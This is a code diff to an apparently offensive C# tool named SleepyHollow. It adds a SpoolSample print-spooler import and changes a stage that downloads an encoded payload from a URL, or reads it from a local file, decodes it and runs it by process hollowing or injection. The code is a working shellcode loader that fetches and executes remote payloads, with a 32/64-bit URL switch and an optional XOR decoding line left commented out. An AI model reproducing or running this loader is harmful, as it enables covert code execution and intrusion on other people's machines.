@@ -1,4 +1,5 @@
-﻿using SleepyHollow;
+using SleepyHollow;
+using SpoolSample;
 
 #if !HEADLESS
 var commands = new Dictionary<string, Dictionary<string, string>>
@@ -114,7 +115,7 @@ switch (options["command"])
         }
         break;
     case "spool":
-        var pipeName = options.ContainsKey("pipe") ? options["pipe"] :null;
+        var pipeName = options.ContainsKey("pipe") ? options["pipe"] : null;
         var payloadUrl = options.ContainsKey("payload") ? options["payload"] : null;
         var executeCmd = options.ContainsKey("cmd") ? options["cmd"] : null;
         if (payloadUrl == null && executeCmd == null)
@@ -129,14 +130,26 @@ switch (options["command"])
         var url = options["payload"];
         var method = options.ContainsKey("method") ? options["method"] : "hollow";
         var wait = options.ContainsKey("wait") ? int.Parse(options["wait"]) : 0;
-
-        if (debugEnabled)
-            Console.WriteLine($"Downloading {url}...");
-        var httpClient = new HttpClient();
-        var data = await httpClient.GetStringAsync(url);
+        string data;
+        if (File.Exists(url))
+        {
+            data = File.ReadAllText(url);
+        }
+        else
+        {
+            if (IntPtr.Size == 4)
+            {
+                url = url.Replace("64", "32");
+            }
+            if (debugEnabled)
+                Console.WriteLine($"Downloading {url}...");
+            var httpClient = new HttpClient();
+            data = await httpClient.GetStringAsync(url);
+        }
         if (debugEnabled)
             Console.WriteLine($"Downloaded {data.Length} bytes");
         var buf = Decoder.DecodeString(data);
+        // buf = Decoder.XorBytes(0xfa, buf);
         if (debugEnabled)
             Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
         var inject = method?.Equals("inject", StringComparison.OrdinalIgnoreCase) ?? false;
